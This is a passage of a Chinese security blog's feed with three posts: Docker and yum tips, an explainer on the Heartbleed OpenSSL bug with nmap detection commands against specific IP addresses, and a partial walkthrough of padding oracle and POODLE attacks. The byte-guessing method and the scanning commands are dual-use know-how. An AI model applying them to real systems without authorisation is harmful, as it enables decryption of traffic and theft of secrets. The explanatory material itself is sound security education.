alt="1603272603871"></p><h1 id="docker-访问宿主机目录"><a href="#docker-访问宿主机目录" class="headerlink" title="docker 访问宿主机目录"></a>docker 访问宿主机目录</h1><h2 id="挂载一个目录"><a href="#挂载一个目录" class="headerlink" title="挂载一个目录"></a>挂载一个目录</h2><pre class="line-numbers language-bash"><code class="language-bash">docker run -it -v <span class="token variable">$path_to_host_data</span><span class="token keyword">:</span><span class="token variable">$new_path_in_docker</span> deep_sleepnet:1.0 /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 执行之后，相当于把此数据目录挂载在对应docker的目录中，用  即可查看并访问所挂载数据。Dockerfile中最后一行运行相应的 </p><p>例如：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker run -it -m 4G -v /var/log/suricata:/mnt -p 5601:5601 -p 9200:9200 -p 5044:5044 sebp/elk: 638</span><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker ps -a</span>CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                                                              NAMES45a7bc7b174d        sebp/elk:623        <span class="token string">"/usr/local/bin/star…"</span>   13 hours ago        Up 12 hours         0.0.0.0:5044-<span class="token operator">></span>5044/tcp, 0.0.0.0:5601-<span class="token operator">></span>5601/tcp, 0.0.0.0:9200-<span class="token operator">></span>9200/tcp, 9300/tcp   charming_wu<span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker exec -it 45a7bc7b174d bash</span>root@45a7bc7b174d:/<span class="token comment" spellcheck="true"># ls</span>bd_build  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到宿主机文件夹mnt</p><p><img src="/2020/09/03/m01ly-wiki/1603765650364.png" alt="1603765650364"></p><h2 id="挂载两个目录"><a href="#挂载两个目录" class="headerlink" title="挂载两个目录"></a>挂载两个目录</h2><p>注意每个目录前都要加参数-v</p><pre class="line-numbers language-bash"><code class="language-bash">docker run -it -v <span class="token variable">$path_to_host_data</span><span class="token keyword">:</span><span class="token variable">$new_path_in_docker</span> -v <span class="token variable">$path1_to_host_data</span><span class="token keyword">:</span><span class="token variable">$new_path1_in_docker</span> deep_sleepnet:1.0 /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="docker-compose命令不存在、未找到命令"><a href="#docker-compose命令不存在、未找到命令" class="headerlink" title="docker-compose命令不存在、未找到命令"></a>docker-compose命令不存在、未找到命令</h1><p>安装扩展源</p><pre><code>sudo yum -y install epel-release</code></pre><p>安装python-pip模块</p><pre><code>sudo yum install python-pip</code></pre><p>查看docker-compose版本,<strong>提示未找到命令</strong></p><pre><code>./docker-compose version</code></pre><p><img src="/2020/09/03/m01ly-wiki/1611136362318.png" alt="1611136362318"></p><p>通过以命令进行安装</p><pre><code>cd /usr/local/bin/wget https://github.com/docker/compose/releases/download/1.14.0-rc2/docker-compose-Linux-x86_64rename docker-compose-Linux-x86_64 docker-compose docker-compose-Linux-x86_64chmod +x /usr/local/bin/docker-compose./usr/local/bin/docker-compose versionsudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose#加个软连接docker-compose version</code></pre><p><img src="/2020/09/03/m01ly-wiki/1611136334326.png" alt="1611136334326"></p><p><img src="/2020/09/03/m01ly-wiki/1611136724260.png" alt="1611136724260"></p><p>卸载</p><pre><code>sudo rm /usr/local/bin/docker-compose</code></pre><p>升级</p><p><a href="https://github.com/docker/compose/releases/">查看最新版本</a>，选择版本复制链接即可。</p><p><img src="/2020/09/03/m01ly-wiki/1611137297043.png" alt="1611137297043"></p><pre><code>cd /usr/local/bin/wget https://github.com/docker/compose/releases/download/1.28.0/docker-compose-Linux-x86_64rename docker-compose-Linux-x86_64 docker-compose docker-compose-Linux-x86_64chmod +x /usr/local/bin/docker-compose./usr/local/bin/docker-compose versionsudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose#加个软连接docker-compose version</code></pre><h1 id="wps打开CSV乱码"><a href="#wps打开CSV乱码" class="headerlink" title="wps打开CSV乱码"></a>wps打开CSV乱码</h1><p>（1）使用记事本打开CSV文件</p><p>（2）点击菜单：文件-另存为，编码方式选择ANSI</p><h1 id="kali安装pip"><a href="#kali安装pip" class="headerlink" title="kali安装pip"></a>kali安装pip</h1><p><a href="https://www.cnblogs.com/fzblog/p/12940714.html">https://www.cnblogs.com/fzblog/p/12940714.html</a></p><h1 id="CentOS-7升级Python到3-5后yum出错"><a href="#CentOS-7升级Python到3-5后yum出错" class="headerlink" title="CentOS 7升级Python到3.5后yum出错"></a><a href="https://www.cnblogs.com/linkxu1989/p/6955137.html">CentOS 7升级Python到3.5后yum出错</a></h1><p>solution:将下面两个文件的开头改为从!/usr/bin/python 改成!/usr/bin/python2.7 </p><pre><code>vi /usr/bin/yumvi /usr/libexec/urlgrabber-ext-down  </code></pre>]]></content:encoded>
      
      
      
      
      <comments>https://m01ly.github.io/2020/09/03/m01ly-wiki/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>TLS攻击之心脏滴血</title>
      <link>https://m01ly.github.io/2020/09/03/htps-attack-heartbleed/</link>
      <guid>https://m01ly.github.io/2020/09/03/htps-attack-heartbleed/</guid>
      <pubDate>Thu, 03 Sep 2020 02:10:29 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;一-心脏滴血介绍&quot;&gt;&lt;a href=&quot;#一-心脏滴血介绍&quot; class=&quot;headerlink&quot; title=&quot;一 心脏滴血介绍&quot;&gt;&lt;/a&gt;一 心脏滴血介绍&lt;/h1&gt;&lt;p&gt; &lt;strong&gt;心脏滴血漏洞(CVE-2014-0160)&lt;/strong&gt; 是一个出现在加密程序库OpenSSL的安全漏洞，openssl是用于实现TLS协议的库。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;受影响的版本：&lt;/strong&gt; OpenSSL1.0.1、1.0.1a 、1.0.1b 、1.0.1c 、1.0.1d 、1.0.1e、1.0.1f、Beta 1 of OpenSSL 1.0.2等版本 &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;影响范围&lt;/strong&gt;：只要使用的是存在缺陷的OpenSSL实例，无论是服务器还是客户端，都可能因此而受到攻击。 因为缺陷在于OpenSSL的实现，而不是SSL/TLS协议本身，所以除了OpenSSL之外的其他TLS实现方式，如GnuTLS、Mozilla的网络安全服务（NSS）和Windows平台的TLS实现都不受影响。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞原理：&lt;/strong&gt;在实现TLS的心跳扩展时没有对输入进行适当验证（缺少边界检查，因此漏洞的名称来源于“心跳”（heartbeat）。该程序错误属于缓冲区过读，即可以读取的数据比应该允许读取的还多 。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一-心脏滴血介绍"><a href="#一-心脏滴血介绍" class="headerlink" title="一 心脏滴血介绍"></a>一 心脏滴血介绍</h1><p> <strong>心脏滴血漏洞(CVE-2014-0160)</strong> 是一个出现在加密程序库OpenSSL的安全漏洞，openssl是用于实现TLS协议的库。</p><p><strong>受影响的版本：</strong> OpenSSL1.0.1、1.0.1a 、1.0.1b 、1.0.1c 、1.0.1d 、1.0.1e、1.0.1f、Beta 1 of OpenSSL 1.0.2等版本 </p><p><strong>影响范围</strong>：只要使用的是存在缺陷的OpenSSL实例，无论是服务器还是客户端，都可能因此而受到攻击。 因为缺陷在于OpenSSL的实现，而不是SSL/TLS协议本身，所以除了OpenSSL之外的其他TLS实现方式，如GnuTLS、Mozilla的网络安全服务（NSS）和Windows平台的TLS实现都不受影响。</p><p><strong>漏洞原理：</strong>在实现TLS的心跳扩展时没有对输入进行适当验证（缺少边界检查，因此漏洞的名称来源于“心跳”（heartbeat）。该程序错误属于缓冲区过读，即可以读取的数据比应该允许读取的还多 。</p><a id="more"></a><h1 id="二-漏洞原理分析"><a href="#二-漏洞原理分析" class="headerlink" title="二 漏洞原理分析"></a>二 漏洞原理分析</h1><h2 id="2-1-心跳机制"><a href="#2-1-心跳机制" class="headerlink" title="2.1 心跳机制"></a>2.1 心跳机制</h2><p> TLS / SSL协议的一个重要组成部分被称为“心跳”。从本质上讲，<strong>心跳就是两台电脑互相通信从而让对方知道它们仍然相连，即使用户没有下载或上传任何东西。</strong></p><p><strong>（1） 正常心跳检测</strong></p><p>每过一段时间，浏览器会发送一个加密的数据到服务器端，这被称为心跳请求，至关重要的是，心跳请求里包含自己的长度信息。例如下图中，</p><p><strong>客户端：</strong>内容为abcdefghij,，自己的长度为10字节 。</p><p><strong>服务器</strong>：收到消息时，会分配一个内存缓冲区（一个物理内存区域用以存储信息），该区域的存储空间和心跳请求信号里的长度一致，即10字节。接下来，它会存储请求信号的加密数据到内存缓冲区，然后读取数据并将其发送回你的浏览器，来证明连接仍然存在。</p><p><img src="/2020/09/03/htps-attack-heartbleed/1599116465905.png" alt="1599116465905"></p><p><strong>（2） 心脏滴血</strong></p><p> 心脏出血漏洞的出现是因为，**OpenSSL的心跳功能缺少了一个至关重要的安全维护手段：计算机接受心跳请求时从不检查该请求和它声称的内容是否一致，及从不检查所请求的数据长度是否和声称的数据长度一致，导致响应方返回额外长度的数据，具体如下图所示：</p><p><strong>客户端心跳请求：</strong>abcdefghij,，心跳长度为10字节 。</p><p><strong>服务器端：</strong>接收心跳数据后，没有对心跳请求数据长度和声称 的10字节长度进行检查，直接分配200字节缓存区，存储心跳数据。返回数据时，从缓冲区读取200字节的数据返回给客户端。这时候缓冲区可能会存在密钥，用户名，密码等隐私信息（可想而知payload需要精心构造以读取有用的隐私信息，这里仅仅简单描述攻击原理）。</p><p><img src="/2020/09/03/htps-attack-heartbleed/1599117066503.png" alt="1599117066503"></p><h2 id="2-2-心脏出血错误代码"><a href="#2-2-心脏出血错误代码" class="headerlink" title="2.2 心脏出血错误代码"></a>2.2 心脏出血错误代码</h2><p>导致心脏出血漏洞的编程错误可以归于一行代码：</p><pre><code>memcpy(bp, pl, payload);</code></pre><p>memcpy()是复制数据的命令。bp是被复制的数据的存储区域，pl是被复制的数据的来源，payload是被复制的数据长度。<strong>问题在于，该命令没有检验pl复制的数据是否和payload给予的长度相符。</strong></p><h1 id="3-修复心脏滴血漏洞"><a href="#3-修复心脏滴血漏洞" class="headerlink" title="3 修复心脏滴血漏洞"></a>3 修复心脏滴血漏洞</h1><p>修补心脏出血漏洞的方式是更新最新的OpenSSL版本，你可以在官网上获取相关链接 <a href="https://www.openssl.org/source/">https://www.openssl.org/source/</a> 。</p><p>因为OpenSSL是开源的，以下是<strong>修复过的代码</strong>： 代码的第一部分的功能是确定心跳请求的大小不是0KB，不然可能会出错。第二部分用来检验心跳的长度是否和它声称的相符。 </p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">*</span> Read type <span class="token operator">and</span> payload length first<span class="token operator">*</span><span class="token operator">/</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">></span> s<span class="token operator">-</span><span class="token operator">></span>s3<span class="token operator">-</span><span class="token operator">></span>relent<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">/</span>silently discard <span class="token operator">*</span><span class="token operator">/</span>hbtype <span class="token operator">=</span> <span class="token operator">*</span>p<span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">;</span>n2s<span class="token punctuation">(</span>p<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">+</span> payload <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">></span> s<span class="token operator">-</span><span class="token operator">></span>s3<span class="token operator">-</span><span class="token operator">></span>rrec<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">/</span> silently discard per RFC <span class="token number">6520</span> sec<span class="token punctuation">.</span> <span class="token number">4</span> <span class="token operator">*</span><span class="token operator">/</span>pl <span class="token operator">=</span> p<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="4-心脏滴血漏洞检测"><a href="#4-心脏滴血漏洞检测" class="headerlink" title="4  心脏滴血漏洞检测"></a>4  心脏滴血漏洞检测</h1><h2 id="4-1-nmap"><a href="#4-1-nmap" class="headerlink" title="4.1  nmap"></a>4.1  nmap</h2><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 443 --script ssl-heartbleed 66.175.219.225或者nmap -sV --script<span class="token operator">=</span>ssl-heartbleed 111.X.X.53 -p 443<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>其他检测TLS工具也可检测，具体见：<a href="https://m01ly.github.io/2020/08/26/htps-tools/">TLS检测小工具</a> </p><h2 id="4-2-网上在线检测"><a href="#4-2-网上在线检测" class="headerlink" title="4.2 网上在线检测"></a>4.2 网上在线检测</h2><p> <a href="http://possible.lv/tools/hb/">http://possible.lv/tools/hb/</a> </p><p> <a href="http://filippo.io/Heartbleed/">http://filippo.io/Heartbleed/</a> </p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p>1  <a href="https://www.aqniu.com/news-views/28453.html">https://www.aqniu.com/news-views/28453.html</a>   通俗易懂</p><p>2 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160</a>  漏洞详情</p><p>3 <a href="https://blog.csdn.net/yaofeiNO1/article/details/54428021">https://blog.csdn.net/yaofeiNO1/article/details/54428021</a>  可利用的payload</p><p>4 <a href="https://www.cnblogs.com/KevinGeorge/p/8029947.html">https://www.cnblogs.com/KevinGeorge/p/8029947.html</a>   POC</p><p>5<a href="https://zh.wikipedia.org/wiki/%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80%E6%BC%8F%E6%B4%9E">https://zh.wikipedia.org/wiki/%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80%E6%BC%8F%E6%B4%9E</a>  wiki</p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/TLS/">TLS</category>
      
      
      <comments>https://m01ly.github.io/2020/09/03/htps-attack-heartbleed/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>TLS 攻击之POODLE</title>
      <link>https://m01ly.github.io/2020/09/01/htps-attack-paddingoracle/</link>
      <guid>https://m01ly.github.io/2020/09/01/htps-attack-paddingoracle/</guid>
      <pubDate>Tue, 01 Sep 2020 03:20:23 GMT</pubDate>
      
      <description>&lt;p&gt;转载 &lt;a href=&quot;http://www.bewindoweb.com/272.html%EF%BC%8C%E5%85%B7%E4%BD%93%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90%EF%BC%8C%E5%86%99%E7%9A%84%E5%BE%88%E5%A5%BD%EF%BC%8C%E7%84%B6%E5%90%8E%E6%96%87%E7%AB%A0%E6%88%91%E5%8A%A0%E5%85%A5%E4%BA%86%E8%87%AA%E5%B7%B1%E7%9A%84%E7%90%86%E8%A7%A3%E3%80%82&quot;&gt;http://www.bewindoweb.com/272.html，具体实例分析，写的很好，然后文章我加入了自己的理解。&lt;/a&gt;&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>转载 <a href="http://www.bewindoweb.com/272.html%EF%BC%8C%E5%85%B7%E4%BD%93%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90%EF%BC%8C%E5%86%99%E7%9A%84%E5%BE%88%E5%A5%BD%EF%BC%8C%E7%84%B6%E5%90%8E%E6%96%87%E7%AB%A0%E6%88%91%E5%8A%A0%E5%85%A5%E4%BA%86%E8%87%AA%E5%B7%B1%E7%9A%84%E7%90%86%E8%A7%A3%E3%80%82">http://www.bewindoweb.com/272.html，具体实例分析，写的很好，然后文章我加入了自己的理解。</a></p><a id="more"></a><h2 id="一、-POODLE简介"><a href="#一、-POODLE简介" class="headerlink" title="一、 POODLE简介"></a>一、 POODLE简介</h2><p>2014年9月Google的一份研究报告<a href="https://www.openssl.org/~bodo/ssl-poodle.pdf">《This POODLE Bites: Exploiting The SSL 3.0 Fallback》</a>指出，SSL存在安全漏洞CVE­-2014-3566，代号为POODLE（Padding Oracle On Downgraded Legacy Encryption，基于降级旧加密协议的填充提示），该漏洞可以使得攻击者获取到一段明文数据，比如HTTP的cookie。</p><p><strong>漏洞影响版本：</strong>SSL v3.0以下</p><p><strong>防御方法：</strong>完全禁用SSL，或者利用TLS_FALLBACK_SCSV字段禁止协议降级到SSL</p><h1 id="二、Padding-Oracle-攻击原理"><a href="#二、Padding-Oracle-攻击原理" class="headerlink" title="二、Padding Oracle 攻击原理"></a>二、Padding Oracle 攻击原理</h1><p>Padding Oracle是Web程序渗透的经典攻击方式，由Juliano Rizzo和Thai Duong于2010年<a href="http://netifera.com/research/">《Practical Padding Oracle Attacks》</a>提出，该攻击利用CBC（Cipher-block chaining，密码块链接模式）加密模式中的填充漏洞给出的提示信息逐步推导出明文数据。</p><h2 id="2-1-CBC密码块链接模式——加密"><a href="#2-1-CBC密码块链接模式——加密" class="headerlink" title="2.1 CBC密码块链接模式——加密"></a><strong>2.1 CBC密码块链接模式——加密</strong></h2><p><img src="/2020/09/01/htps-attack-paddingoracle/1598950607286.png" alt="1598950607286"></p><p>（1）对明文进行分组，每组长度相同（一般为8字节或16字节），对长度不足的分组需要进行填充（Padding）。</p><p>填充通常遵循的是PKCS5标准，即填充的字符是需要填充字符的个数。</p><p>例如，这里的明文字符串为“GET /a HTTP/1.1\r”，那么按ASCII的十六进制就可以表示为：</p><ul><li>第一组明文：“0x47、0x45、0x54、0x20、0x2F、0x61、0x20、0x48”</li><li>第二组明文：“0x54、0x54、0x50、0x2F、0x31、0x2E、0x31、0x0D”</li></ul><p>假设后面还有字符不能构成8字节的一组，那么需要进行填充，例如（前面字符没有用十六进制表示）：</p><p><img src="/2020/09/01/htps-attack-paddingoracle/1598950619500.png" alt="1598950619500"></p><p>当然，一般不会有全填充的组。</p><p>（2）随机生成一个初始化向量IV，与第一个明文分组进行异或运算得到中间值（Intermediary Value）。</p><p>例如这里随机生成的IV为“0x01、0x02、0x03、0x04、0x05、0x06、0x07、0x08”，与第一个分组“0x47、0x45、0x54、0x20、0x2F、0x61、0x20、0x48”进行异或后得到“0x46、0x47、0x57、0x24、0x2A、0x67、0x27、0x40”。</p><p>（3）将异或结果进行加密，得到第一个明文分组的密文。</p><p>一般会使用密钥（key）加密，这里简单假设密钥加密效果等同于加密函数y = f(x) = x + 1，那么可以得到第一组密文“0x47、0x48、0x58、0x25、0x2B、0x68、0x28、0x41”。</p><p>（4）从第二个明文分组开始，将上一组密文当作IV，进行异或运算，再进行加密，得到该组密文。</p><p>例如这里由第一组密文“0x47、0x48、0x58、0x25、0x2B、0x68、0x28、0x41”与第二组明文“0x54、0x54、0x50、0x2F、0x31、0x2E、0x31、0x0D”进行异或，得到“0x13、0x1C、0x08、0x0A、0x1A、0x46、0x19、0x4C”，再进行相同加密，得到“0x14、0x1D、0x09、0x0B、0x1B、0x47、0x1A、0x4D”，这就是第二组密文。</p><h2 id="2-2-CBC密码块链接模式——解密"><a href="#2-2-CBC密码块链接模式——解密" class="headerlink" title="2.2 CBC密码块链接模式——解密"></a><strong>2.2 CBC密码块链接模式——解密</strong></h2><p><img src="/2020/09/01/htps-attack-paddingoracle/1598950639436.png" alt="1598950639436"></p><p>加密的IV是随机生成的，而解密则必须使用这个IV。</p><p>（1）对密文进行分组，每组长度相同（一般为8字节或16字节）。</p><p>例如这里将密文分为了两组：</p><ul><li>第一组密文：“0x47、0x48、0x58、0x25、0x2B、0x68、0x28、0x41”</li><li>第二组密文：“0x14、0x1D、0x09、0x0B、0x1B、0x47、0x1A、0x4D”</li></ul><p>（2）对密文进行解密，得到中间值。</p><p>一般使用密钥，同样的这里假设密钥效果等同于函数x = f(y) = y - 1</p><ul><li>第一组中间值：“0x46、0x47、0x57、0x24、0x2A、0x67、0x27、0x40”</li><li>第二组中间值：“0x13、0x1C、0x08、0x0A、0x1A、0x46、0x19、0x4C”</li></ul><p>（3）使用初始化向量IV，与第一个分组进行异或运算得到第一组明文。</p><p>这是利用异或的性质：a⊕b=c，a⊕c=b，b⊕c=a，所以无论如何异或都能得到唯一的第三个数。</p><p>例如这里IV为“0x01、0x02、0x03、0x04、0x05、0x06、0x07、0x08”，第一个数0x01与第一组第一个中间值0x46异或结果为0x47，就是明文“G”的ASCII十六进制表示，于是得到第一组明文“0x47、0x45、0x54、0x20、0x2F、0x61、0x20、0x48”</p><p>（4）从第二组开始，依次将前一组密文和该组中间值异或，得到该组明文。</p><p>例如第一组密文“0x47、0x48、0x58、0x25、0x2B、0x68、0x28、0x41”和第二组中间值“0x13、0x1C、0x08、0x0A、0x1A、0x46、0x19、0x4C”异或得到第二组明文“0x54、0x54、0x50、0x2F、0x31、0x2E、0x31、0x0D”。</p><p>值得注意的是，<strong>解密可以并行计算，因为密文都是已经获取好的</strong>；加密则不行，因为前一组密文必须要计算出来。</p><h2 id="2-3-Padding-Oracle-攻击"><a href="#2-3-Padding-Oracle-攻击" class="headerlink" title="2.3 Padding Oracle 攻击"></a><strong>2.3 Padding Oracle 攻击</strong></h2><h4 id="2-3-1-攻击原理"><a href="#2-3-1-攻击原理" class="headerlink" title="2.3.1 攻击原理"></a>2.3.1 攻击原理</h4><p><img src="/2020/09/01/htps-attack-paddingoracle/1599017277323.png" alt="1599017277323"></p><p><strong>攻击最终原理：</strong></p><p><strong>目标：</strong>已知IV，密文。求中间值。</p><p><strong>方法：</strong></p><p>通过逐字节伪造IV使得：<br>$$<br>伪造IV+中间值=0x01(明文)<br>$$<br>（因为服务器端会进行padding校验，回显成功与否，这里用的padding是pkcs#5）</p><p>然后利用：<br>$$<br>0x01(明文)+真实IV=中间值<br>$$<br>即可求得中间值，从而通过下列等式求得明文。<br>$$<br>真实IV+中间值=明文<br>$$</p><h4 id="2-3-2-攻击过程"><a href="#2-3-2-攻击过程" class="headerlink" title="2.3.2 攻击过程"></a>2.3.2 攻击过程</h4><hr><p>首先请注意，始终在字符串的末尾附加至少一个填充字节，因此将使用0x01填充7字节的值（如AVOCADO），而将8字节的值（如PLANTAIN）具有向其中添加了完整的填充块。填充字节的值还指示字节数，因此逻辑上最后一个密文块末尾的逻辑最终值必须是：</p><ul><li>单个0x01字节（0x01）</li><li>两个0x02字节（0x02、0x02）</li><li>三个0x03字节（0x03、0x03、0x03）</li><li>四个0x04字节（0x04、0x04、0x04、0x04）</li><li>…等等</li></ul><p><strong>如果最终的解密块未以这些有效字节序列之一结尾，则大多数密码提供程序将抛出无效的填充异常。引发此异常的事实对于攻击者（我们）而言至关重要，因为它是填充预言攻击的基础</strong>。</p><p>现在构造一个场景：假设密文仍然是上述字段“GET /a HTTP/1.1\r”，且用户连接到的是公共WIFI，攻击者可以通过抓包获取CBC密文以及初始化向量IV（当然要把IV明文传给服务器否则服务器无法解密第一个分组）。</p><p>我们现在希望通过密文和IV获取明文，由于“IV⊕中间值=明文”，问题转变为如何求IV对应的中间值。</p><p>我们知道，对大多数Web服务器而言：</p><ul><li><p>收到有效的密文（正确填充并包含有效数据的密文）后，应用程序将正常响应（200 OK）</p></li><li><p>收到无效的密文（解密后不会以有效填充结尾）时，应用程序将引发加密异常（500 Internal Server Error）</p></li><li><p><em>收到有效的密文（正确填充的密文）但解密为无效值时，应用程序将显示自定义错误消息（200 OK）</em></p><p>上面描述的场景是经典的Padding Oracle，因为我们可以使用应用程序的行为轻松确定提供的加密值是否正确填充。术语oracle是指可以用来确定测试通过还是失败的机制。</p><p>IV出现在解密的最后一步，而且是可以构造的，那么攻击者可以通过构造特殊的IV，直到符合“填充”规则通过解密流程（虽然不一定能通过数据合法性校验），具体而言：</p></li></ul><p>（1）构造“0x00、0x00、0x00、0x00、0x00、0x00、0x00、0x00”的特殊IV发送给服务端，不断尝试递增最后一位并发送给服务端，直到服务端解密成功。</p><p><img src="/2020/09/01/htps-attack-paddingoracle/1598950652145.png" alt="1598950652145"></p><p>此时必然产生了1位填充（因为我们已经知道IV是0x01、0x02、0x03、0x04、0x05、0x06、0x07、0x08），最多尝试次数为256次。（<strong>这里最后一位必须为01才可以通过服务器的padding校验，因为采用的是PKCS5标准填充</strong>）</p><p>（2）计算出末位中间值，其值等于伪造向量末位异或0x01：0x41⊕0x01=0x40</p><p><img src="/2020/09/01/htps-attack-paddingoracle/1598950673196.png" alt="1598950673196"></p><p>（3）利用原始向量末位值异或中间值，得到明文0x48，即字符“H”：0x40⊕0x08=0x48</p><p><img src="/2020/09/01/htps-attack-paddingoracle/1598950689577.png" alt="1598950689577"></p><p>（4）利用中间值计算出末位为0x02的伪造向量应有值：0x40⊕0x02=0x42</p><p><img src="/2020/09/01/htps-attack-paddingoracle/1598950705091.png" alt="1598950705091"></p><p>（5）通过改变倒数第二位，直到生成0x020x02的末位明文填充字符，符合2位填充规则，然后类似地推测倒数第二位的中间值：</p><p><img src="http://cdn.bewindoweb.com/uploadpic/9a93974acc1def3a2247974deb3a6392.jpeg" alt="img"></p><p>重复上述步骤，就能够得到完整的明文信息，这就是Padding Oracle 填充提示攻击。</p><h1 id="三、POODLE攻击原理"><a href="#三、POODLE攻击原理" class="headerlink" title="三、POODLE攻击原理"></a>三、POODLE攻击原理</h1><h2 id="3-1-SSLv3-0存在的问题"><a href="#3-1-SSLv3-0存在的问题" class="headerlink" title="3.1 SSLv3.0存在的问题"></a><strong>3.1 SSLv3.0存在的问题</strong></h2><p>SSLv3.0的记录层可以使用如下加密方式：</p><table><thead><tr><th align="left">加密类型</th><th align="left">加密方式</th></tr></thead><tbody><tr><td align="left">块加密 Block Cipher</td><td align="left">IDEA</td></tr><tr><td align="left">块加密 Block Cipher</td><td align="left">RC2-40</td></tr><tr><td align="left">块加密 Block Cipher</td><td align="left">DES-40</td></tr><tr><td align="left">块加密 Block Cipher</td><td align="left">DES</td></tr><tr><td align="left">块加密 Block Cipher</td><td align="left">3DES</td></tr><tr><td align="left">块加密 Block Cipher</td><td align="left">FORTEZZA</td></tr><tr><td align="left">流加密 Stream Cipher</td><td align="left">RC-40</td></tr><tr><td align="left">流加密 Stream Cipher</td><td align="left">RC4-128</td></tr></tbody></table><p>流加密这里不讨论，也是有安全问题，主要讨论CBC块加密。</p><p><img src="/2020/09/01/htps-attack-paddingoracle/1598952050289.png" alt="1598952050289"></p><p>SSL记录层加密的是原始数据+MAC（消息验证码）信息摘要+填充字节，MAC一般是Hash值，SSLv3.0中MAC通常为20字节。也就是说，SSL先对数据做完整性校验，再进行CBC加密。在CBC解密的一端（服务器），SSL没有规定padding填充块字节内容，只校验填充块最后一个字节，该字节为填充长度，然后去掉填充的字符，再进行MAC验证，最后获得明文数据。</p><ul><li>先校验完整性，再加密，使得对端收到数据后先解密，后校验完整性，解密是否成功为攻击提供了判断依据；</li><li>只验证填充块的最后一个字节，因此填充块可以填充任意字符，且最后字符固定使得攻击者可以利用类似Padding Oracle的攻击机制。</li></ul><p>我们可以利用类似前面Padding Oracle的思路，将要解密的字符放到最后一个块末尾，不断地调整前一个IV的值（可能是初始化向量，也可能是前一段的密文，并且无论是哪个攻击者都是知道的），直到成功通过解密，此时明文必定为0x07或0x15（16字节一块的话）（因为需要填充一整块），最多尝试256次（或512次），就能够通过服务器验证，从而推导出对应的中间值，然后利用该中间值和IV推导出明文。这期间不用担心修改IV导致MAC校验失败，因为那是CBC解密之后的事情。</p><h2 id="3-2-利用SSL漏洞进行POODLE攻击"><a href="#3-2-利用SSL漏洞进行POODLE攻击" class="headerlink" title="3.2 利用SSL漏洞进行POODLE攻击"></a><strong>3.2 利用SSL漏洞进行POODLE攻击</strong></h2><p>假设攻击者B代理了客户端A的HTTPS访问服务器C的请求，可以截获到SSL密文数据以及SSL握手阶段的IV，且可以通过A去发送HTTPS请求，此时如果A没有退出登录，都会自动携带上Cookie。这样，B可以控制A发送的HTTP请求中的请求路径Path和请求体Body，并通过调整Path和Body，让A发出的请求满足两个条件：</p><ul><li>填充字段恰好填充了一个块长度</li><li>Cookie的第一个未知字符刚好出现在前面某个块的末尾</li></ul><p>例如，加密采用3DES，8字节一个块，且SSL上层为HTTP协议，发送的明文为：</p><pre class="line-numbers language-html"><code class="language-html">GET / HTTP/1.1\r\nCookie: abcdefgh \r\n\r\nXXXX MAC数据 XXXXXX7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="http://cdn.bewindoweb.com/uploadpic/4343d6e74ca6d402f60be08d3af7e425.jpeg" alt="img"></p><p>MAC数据可能并不是刚好8字节，不过无所谓。攻击者并不知道明文，但知道Cookie密文的位置，知道此时想要解密的cookie的最后一个字符在第4个块末尾。然后攻击者将整个块的密文复制到最后一个填充块密文上：</p><p><img src="http://cdn.bewindoweb.com/uploadpic/865b1480ac514fd22f27de5b08825418.jpeg" 